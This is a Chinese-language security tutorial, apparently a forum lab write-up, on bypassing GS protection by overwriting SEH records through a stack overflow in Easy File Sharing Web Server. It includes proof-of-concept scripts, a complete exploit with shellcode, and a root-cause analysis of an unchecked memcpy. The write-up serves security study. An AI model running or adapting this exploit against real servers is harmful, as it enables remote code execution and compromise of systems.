Windows漏洞学习之栈溢出覆盖SEH
====================

0x00 简介
-------

这篇文章主要是介绍SEH机制以及在实战中怎么利用栈溢出覆盖SEH达到绕过GS保护机制，从而执行你的shellcode。

0x01 SEH介绍
----------

Windows系统需要它运行的软件能够从发生的错误中恢复，为了达到这个目的，它允许开发人员指定当程序遇到问题（或异常）并编写在出现错误时运行的特殊代码（处理程序）。换句话说，Windows 为开发人员实现了一种结构化的方式来处理他们称之为结构化异常处理程序的异常。

我们实际上可以通过覆盖原始的 SEH 代码来劫持这个过程来运行我们想要的代码。然后，让我们执行代码所需要做的就是通过写入缓冲区的末尾来故意触发错误（异常）。

Windows SEH 实现了一系列代码块来处理异常，作为在单个块无法处理错误的情况下有多个回退选项的一种方式。此代码可以写入软件或操作系统本身。每个程序都有一个 SEH 链，即使是没有开发人员编写的任何错误处理代码的软件。下面有一张关于 SEH 链的图解：

![lYisnTc](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cce2984c880f6a808019b86069e9aa23bd03b285.png)

0x02 利用SEH
----------

### 基本步骤：

1. 首先要利用栈溢出漏洞得到溢出点到SEH结构体的偏移量。
2. 然后要得到shellcode的起始位置。
3. 触发异常。

以上步骤是最基本的，在真实的环境中我们还需要考虑其他因素。

0x03 实验过程
---------

### 实验环境与工具

攻击机：Kali-Linux-2021.2-vmware-amd64 192.168.xxx.xxx

靶机：Win7 旗舰版 192.168.xxx.xxx

漏洞程序：Easy File Sharing Web Server 2018

服务端口： 80

调试器：Immunity Debugger-漏洞分析专用调试器（安装了mona插件）、X32dbg

### Easy File Sharing Web Server 6.9 缓冲区溢出漏洞介绍

由于Easy File Sharing Web Server 6.9这个程序对输入的用户名长度不进行校验，存在缓冲区溢出漏洞，导致当用户输入太长的用户名导致缓冲区溢出，覆盖程序原本的返回地址，导致程序因跳转到非法地址奔溃或跳转到黑客控制的恶意代码地址进而导致服务器被黑客控制。

### 本地调试

利用Immunity Debugger打开漏洞程序Easy File Sharing Web Server 2018，并且让它跑起来：

![121342](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cee941ac6749fb26ac9653c9245535959c472718.jpg)

#### 确认漏洞

我们需要通过快速验证脚本（POC） 来确认该漏洞。 下面是我构造的 Python 脚本，目的是发送5000个字符到目标服务器上（数量不同覆盖到的SEH也不同，不过本质一样，这里用5000做测试），我给它起名 easyfileshring\_POC.py：

```python
import socket
import sys

host = str(sys.argv[1])  #第一个参数是目标ip
port = int(sys.argv[2])  #第二个参数是目标端口

a = socket.socket() 

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port)) #建立连接

buff = 'a' * 5000  #发送内容

a.send("GET " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."

```

然后，我们打开kali运行该python脚本，

![Screenshot 2021-11-05 165420](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8cc94da24a17a6f85c28600f9303758673ca6f1f.jpg)

转动靶机上查看，

![image-20211220173032071](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d04bd90549450cd757fe97b3e71deb54dc5e1048.png)

发现程序停住了，因为在读取地址EAX+4C里的值时发生读取错误，因为EAX = 61616161（即我们POC中发送的“a”的ascill）不是一个合法地址，说明程序发生了栈溢出，导致EAX的值是溢出的字符，我们打开Immunity Debugger的SEH chain，

![Screenshot 2021-11-05 170129](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a184e5083d9dd29217b46632c57afef58c2a7397.jpg)

查看SEH chain，发现SEH被覆盖成了溢出值

![12143](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16cd3e9844f7a78637e08071c038d7a2be7223e1.jpg)

这里我们再利用mona命令，生成5000个测试字符：

```php
!mona pattern_create 5000
```

![Screenshot 2021-11-05 173334](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-33a015aa825da4300e605ec87478c7f0a1cd5b34.jpg)

然后去打开生成的pattern.txt，复制生成的5000个测试字符，

![Screenshot 2021-11-05 173427](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f3ab52536ad60225cc6cd7a97df2e84066c6b102.jpg)

然后重启服务程序，并且将POC脚本中发送的内容改为这5000个测试字符，然后再用kali运行脚本，可以发现程序再次停止，键入以下mona命令，来寻找SEH的偏移量：

```php
!mona findmsp
```

![Screenshot 2021-11-05 174540](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-da75442c3e674272c8a70e332fbc1e0c0bb2c179.jpg)

可以知道4061字节可以覆盖到SEH，

#### 构造exp

首先我们知道SEH结构体中有两个成员，一个成员是SEH，另一个成员是NEXT SEH。其中SEH里存放的是一个异常处理函数的地址，而NEXT SEH里存放的是下一个指向SEH结构体的指针。

所以我们可以利用栈溢出覆盖SEH和NEXT SEH的值并且触发GS保护机制（触发异常），然后程序就会执行这个我们覆盖的SEH，我们让这个SEH去执行一段**最后能返回原来的栈上NEXT SEH位置的代码**，执行我们覆盖的NEXT SEH里填写的**jmp + 偏移数 指令**，然后这个程序就能跳转到栈下方我们编写的shellcode，然后执行我们的shellcode。

##### 这里你们肯定会冒出几个疑问？（这几个问题的答案正是我们构造payload的关键点）

**1.为什么SEH里填的地址不能直接是shellcode的地址？**

**2.要让SEH去执行什么代码才能在最后让程序返回原来的栈上NEXT SEH位置？**

**3.SEH里的指向代码地址从哪获得？**

**4.NEXT SEH 里jmp的偏移数填多少比较好？**

**1的答案是：**因为程序默认都会开启 **ALSR**保护 —— 让堆、栈、共享库映射等线性区布局地址随机化，增加攻击者预测目的地址的难度，所以我们无法直接知道程序运行中shellcode在栈上的地址，所以我们要利用在NEXT SEH中填写的jmp来跳转到栈上shellcode起始位置。

**2的答案是：**要利用 **pop-pop-ret** 指令来达到我们预期的效果，原因要从Windows异常处理机制来解释：

###### Windows异常处理机制

在程序运行过程中，当触发了异常，程序尝试处理异常的时候，首先系统会执行异常的回调函数。

```c#
EXCEPTION_DISPOSITION
__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord,
                        void * EstablisherFrame,
                        struct _CONTEXT *ContextRecord,
                        void * DispatcherContext);
```

并在栈中压入一个`EXCEPTION_DISPOSITION Handler`结构，如下图

![aHR0cHM6Ly9zdXBlcmoub3NzLWNuLWJlaWppbmcuYWxpeXVuY3MuY29tLzIwMjAwNTIyMjIwMDUzLnBuZw](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-82b7827bd1210b1cc663f6e664ede7ce64de75f0.png)

这个时候，esp指向栈顶位置就是这个结构体。这个结构体中包含这从TEB（储存与线程相关的内容的结构体）中得到的第一个SEH结构体的位置。这个时候，通过Establisher Frame找到第一个SEH结构体的位置，执行异常处理函数。

- - - - - -

我们分析上面那张栈空间的图可以发现，当触发异常时，此时的esp指向的是EXCEPTION\_DISPOSITION Handler，当执行异常处理函数（被我们改写成执行**pop-pop-ret**）时，esp向高地址移动8个字节，指向了Establisher Frame，存着SEH结构体的第一个成员（NEXT SEH)的地址，因此执行ret会将eip指向NEXT SEH,然后执行NEXT SEH里的指令。

**3的答案是：**从问题2的答案我们可以知道，我们需要在SEH中填写指向的**pop-pop-ret**代码的地址,从问题1的答案我们了解到程序都是默认开启**ALSR**保护的，所以这个地址肯定不是随便给的，那么我们怎么获得指向的**pop-pop-ret**代码的地址，这里我们利用强大的Mona达到我们的目的，在immunity—debuger的终端中键入：

```php
!mona seh
```

它会帮我们找到那个POP POP RET代码块地址，获取的结果可以在seh.txt中查看

![Screenshot 2021-11-05 203535](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16888adef8022c3d4a34d431e280c9050b984de4.jpg)

首先在seh.txt中查找一个未开启 **ALSR** 和 **SafeSEH**（SEH 校验机制） 的模块，这里我们就选择第一个ImageLoad.dll：

![Screenshot 2021-11-05 204406](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-37024fc63bf8ef5ad0d9c66c6bc9a2e1a38e40bb.jpg)

找一个ImageLoad.dll中 利用的寄存器一般不会影响程序运行的**pop-pop-ret**指令地址，同时略过带有“**\\x00**"的地址 (尽量避免出现0x00 防止传送过程中被截断)，

利用POC\_2.py来测试程序能到运行到我们覆盖的NEXT SEH里的**jmp + 偏移数 指令**：

POC\_2.py（在前一个POC的基础上进行修改）:

```python
import socket
import sys

host = str(sys.argv[1])  
port = int(sys.argv[2])  

a = socket.socket() 

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port)) 

offset = 'a' * 4061     # 覆盖SEH结构体的第一个成员NEXT SEH的偏移
Nseh = "\xeb\x14\x90\x90"   # jmp 0x14 指令
seh = "\xa3\x02\x01\x10"    # 我们找到的 pop-pop-ret 指令的地址——例如 0x100102a3
nop = "\x90" * 20   # nop指令——防止jmp跳转过头
shellcode = "\xcc" * 32     # 这里用 int3 来模拟shellcode
exploit = offset + Nseh + seh + nop + shellcode
fill =  "b" * (5000-len(buff)) # 防止栈溢出未触发异常
buff = exploit + fill

a.send("GET " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
```

![1111111112](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fb84bb631afdbddaae95d78f68b6676837cf1dca.jpg)

经过几次的更改对POC中seh的更改并测试，我终于找到一个合适的**pop-pop-ret**指令地址：0x100102a3

让我们看看效果：

![Screenshot 2021-11-05 221456](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0e0163da4cfbef835be4ddb4f6cea487946d67b8.jpg)

程序再次断在了这个地方，原因是读取\[EAX+4C\]错误（触发了异常），因为这时EAX值被改成了我们写入的溢出值 “bbbb”，这时我们看看SEH Chain：

![Screenshot 2021-11-05 221830](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f3dbaceeda44058745ef06dd297bd044546869a3.jpg)

SEH已经被改写为我们选择的**pop-pop-ret**指令地址了，很好，接下来我们按快捷键

```php
Shift + F9
```

执行Immunity Debugger的 **忽略异常继续执行的命令**，

![Screenshot 2021-11-05 222342](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c4865f0a5f14a1ea8daa71f57951f350ad426f60.jpg)

可以看到程序跑进我们写的 **int3** 指令里断下来了，我们离成功更近一步了，注意观察这时候是跑进我们写的第二个 **int3** 指令里，所以如果我们从第二个 **int3** 指令开始写入我们的shellcode，那么程序就会开始执行我们的shellcode，所以我们只要把POC\_2.py的代码进行适当更改就能当成 exp（exploit——漏洞利用脚本）用了。

**4的答案是：**从问题3的答案中你可以看到，我在POC\_2.py中填写的 jmp指令的 **偏移数** 是 0x14 (20),其实这个偏移数的大小没有一个严格的规定，但是它的大小不能超过它后面 **nop** 指令的数量，不然 jmp指令 就很可能在shellcode的起始地址后面落地。所以你可以让不断调试让 jmp 刚刚好跳到shellcode的起始地址上，也可以让 jmp指令 后面 **nop** 指令的数量尽可能大，确保 jmp跳到shellcode前面的 **nop** 指令上（ **nop** 指令是空指令，会直接跳过，直到遇到其他指令），这样程序都能正常执行你的shellcode。

- - - - - -

当你想通上面四个问题时，接下来你就能在把上面的POC\_2.py中的shellcode改成你自己的shellcode了，即获得了这个漏洞程序的exp，easyfileshring\_exp.py：

```php
import socket
import sys

host = str(sys.argv[1])  
port = int(sys.argv[2])  

a = socket.socket() 

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port)) 

offset = 'a' * 4061     # 覆盖SEH结构体的第一个成员NEXT SEH的偏移
Nseh = "\xeb\x14\x90\x90"   # jmp 0x14 指令
seh = "\xa3\x02\x01\x10"    # 我们找到的 pop-pop-ret 指令的地址——例如 0x100102a3
nop = "\x90" * 20   # nop指令——防止jmp跳转过头
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)                   
# 这个shellcode的功能是 弹计算机并使程序崩溃（利用kali漏洞利用库里的 39009.py 里的shellcode） 

exploit = offset + Nseh + seh + nop + shellcode
fill =  "b" * (5000-len(buff)) # 防止栈溢出未触发异常
buff = exploit + fill

a.send("GET " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
```

#### 漏洞exp测试

在kali是运行easyfileshring\_exp.py，调试发现靶机里的shellcode被顺利执行了：

![Screenshot 2021-11-05 231026](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e42af5d3ba5b48d1a4af7788736417ea43bea0d4.jpg)

### 模拟实战攻击

在靶机上正常运行漏洞程序：

![Screenshot 2021-11-05 231715](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cbd09f56ddf475c5a33ec0c5334ff20d403f95cb.jpg)

在kali中利用exp攻击靶机漏洞程序，

![Screenshot 2021-11-05 231900](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e5590ce7d8cb50fcca7e26b8211e533b62b9bf1.jpg)

攻击结果：

![Screenshot 2021-11-05 231942](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d75112326a514825c9dae69a611dab3093843496.jpg)

模拟远程攻击成功，成功执行shellcode。

漏洞产生原因分析
--------

我们想知道这个程序中的栈溢出漏洞是怎么产生的以及溢出点在哪？

### 动静结合（ida+调试器）

这里我没有使用immunity debuger进行动态调试，而是利用x32dbg，因为我个人感觉x32的界面比较舒服，进行溢出点寻找时比较方便。

现在用x32dbg打开漏洞程序，然后在kali上运行exp攻击它，我们可以看到程序断在了`0x61C277F6`，这个地方我们已经无比熟悉了，eax被溢出值覆盖了，导致程序触发异常。

![Screenshot 2021-11-07 175628](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-618d180a73061d3612581c6056f9fb5379405bfc.jpg)

我们目前的思路是先找到eax的来源，因为知道eax的来源就是我们要找的溢出点了，现在打开call stack窗口，

![image-20211107180829184](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-37c653618c436087f4ce1d61f16a2c35e25c4495.png)

看到程序现在跑到了sqlite3模块里面了，即sqlite3.dll，我们将程序安装目录里的sqlite3.dll拉到ida里分析一下，在ida中查找一下程序中断的那个地址，在`sqlite3SafeCheckOK()`里，

![Screenshot 2021-11-07 181510](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8aff567083e84a71b0ef8abfea39ec654e615e0c.jpg)

可以看到让程序中断的那个eax就是这个函数的参数a1，并且只知道eax来源于上层函数  
让我们看看堆栈调用，再次打开call stack，

![Screenshot 2021-11-07 210322](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2ff9991cf38a4bab3b7b0a1138a85b5080951386.jpg)

根据第一个返回地址`0x61C6286C`，我们定位到\_sqlite3LockAndPrepare函数

![Screenshot 2021-11-07 194352](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6b3d74751c0c809194cbc49cfd18a5744ec53123.jpg)

![Screenshot 2021-11-07 210615](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3075d8fd83e90b5b6b5fd5c179ca49ab89d97ea9.jpg)

这里还是没有发现eax的来源，那我们还是看fsws.`00496624` 吧，通过它我们定位到了`sub_496600`函数，

![Screenshot 2021-11-07 204505](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cba6b2926c100d8c1af46465bf2a3e46c9d10f52.jpg)

这里的eax来源于这里的ecx的引用，我们在`sub_496600`函数开头下一个断点，在kali上运行exp，在程序断下来后，再F9运行，第三次断下来时，发现ecx里的地址`05277030`里存着 “AAAA....."，即0x41414141,

![Screenshot 2021-11-07 214014](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dea3cccd93b4d72fa7686b31243a2ff48517c798.jpg)

那这个`0x41414141`是什么时候复制到栈上的呢？ 我们对**ecx的值**下一个**写入断点**吧，

（注意这里要在第一次断在 0x496600 时，对ecx的值下写入断点，因为ecx的值是栈的地址，每一次运行程序都会改变）

再次运行程序，程序断在了这里，

![Screenshot 2021-11-07 220915](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-869af6a6930810eaa89ed9236532286f583b1590.jpg)

我们用ida看看这个地址,在`write_char()`里

![Screenshot 2021-11-07 221056](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-927c6c578eca1c24547ba23643f76c0bba8ef8f2.jpg)

那我们看看堆栈信息，

![Screenshot 2021-11-07 221428](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5449dad7d917ec7fefd09c873fe08440c8694b41.jpg)

依次查看这几个返回地址，并在ida里分析后,我们发现，是`0x4F907A`的

`sprintf()` **--&gt;** `sub_500050()` **--&gt;** `write_string()` **--&gt;** `write_char()`

![Screenshot 2021-11-07 224120](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5966e82cdede42626fc8281c84d6541a0bd3e83b.jpg)

那么我们看最后一个返回地址`0x497483`，在ida里查看，

![image-20211107224548084](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f8853290239ab6adc776469ad895fcc213181a93.png)

在`0x497475`下一个断点，

![Screenshot 2021-11-07 224636](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d868a8adabeeaf7d146aeddf7711328b9a32ec17.jpg)

我想跑到这看看拼接的字符串，

第一次断下来,我们执行到sprintf函数，看看栈上的参数，

发现**edi**指向的地址里储存着“AAAA....."，即0x41414141，作为格式化字符串的第三个参数，按F8单步执行完sprinf函数后，

![Screenshot 2021-11-07 225824](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-80b1f26d2f323333a04d308ab38abf76c22326c4.jpg)

发现，这么长的畸形字符串复制到栈上，使用sprintf格式化后进行拼接，这就造成栈溢出了  
看看确实拼接成sql语句了，之后就有了程序把这一串sql语句拿去给sqlite3.dll处理的时候造成异常，导致程序中断。

具体路径如下，sprintf执行完下一条语句是调用sub\_500050函数  
`sub_500050()` **--&gt;** `write_string()` **--&gt;** `write_char()` **--&gt;** `sub_496600` **--&gt;** `sqlite3_prepare_v2` **--&gt;** `sqlite3LockAndPrepare` **--&gt;** `sqlite3SafetyCheckOk(在这函数里面异常)`

现在我们看看**edi**里的值是从哪来的，在ida里分析**edi**就是**a3**，而**a3**的值是调用`sub_497380()`的函数传给`sub_497380()`的，

![Screenshot 2021-11-08 111816](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b025ed21182289607f0b601da3d0ac351755b2bb.jpg)

在`sub_497380()`开头下一个断点，让程序断在这里，观察栈上返回地址，

![Screenshot 2021-11-08 131301](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6adb10999c8fd3545aecae062c046499edd0a32f.jpg)

通过返回地址`0x42DE73`，在ida里定位，

![Screenshot 2021-11-08 131440](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f3711b2940f87c88fc0a76521a737704f3e043d7.jpg)

发现`sub_497380()`的参数 **a3** 是函数`sub_52D5E7()`的返回值，我们进去看看，

![Screenshot 2021-11-08 131706](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-22c28ac066ef276791be48770838948b85926da8.jpg)

在x32dbg里调试发现畸形字符串不是在这里产生的，

那我们再回到上一层调用看看参数**this**是从哪来的，

![Screenshot 2021-11-08 203438](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6cfb4b802b76a40c6c5e03812274762afa29c2b4.jpg)

参数**this**就是这里的**Substr**，我们利用x32dbg下断点分析，分析**标号1函数**没有被执行，再结合ida分析知道这有个选择结构，判断条件是**v15**的值，**v15=（v38指向的地址里存着的字符串里带有“/"？1:0）**,

![Screenshot 2021-11-08 210528](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d55aecdd5d7a571ba343326ed70c48ebae9a5d76.jpg)

调试发现，**v38**的指向的地址里存着的是我们要找的那个畸形字符串，并且它不带有**“/"**,所以程序不跑**标号1函数**，而是跑进了标号2函数。同时我们也可以知道**标号2函数**也不是产生畸形字符串的地方，因为在它之前**v38**已经出现了，那么我们找一下**v38**里的值是从哪来的，

![Screenshot 2021-11-08 212216](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d21b8ecb75f2706ad18c381603c12ec865de83de.jpg)

我们进去看看，

![Screenshot 2021-11-08 212754](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-582e905085c907013c49d532efa77447005343cc.jpg)

结合x32dbg调试，发现**v38**里畸形字符串就是在这个函数`sub_52D225`中产生的，因为这个函数中使用了`lstrlneA()`获得报文中的字符串长度，然后没有检验长度是否符合要求，直接使用`memcpy_0()`将这个畸形字符串完整的复制到栈上。

总结
--

这个程序的漏洞是由于没有对字符串长度进行检查，直接使用`memcpy()`将报文中大量字符串复制到栈上，造成栈溢出。因为这个程序开启了栈保护，所以我通过栈溢出来覆盖SEH达到绕过栈保护执行任意代码。这次实验不足的地方还有很多，做了很多重复无用的工作，只能说经验不足吧。不过这次实验对我的收获很大，让我对动态调试和静态分析的使用更加熟练了。

参考文章
----

<https://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html>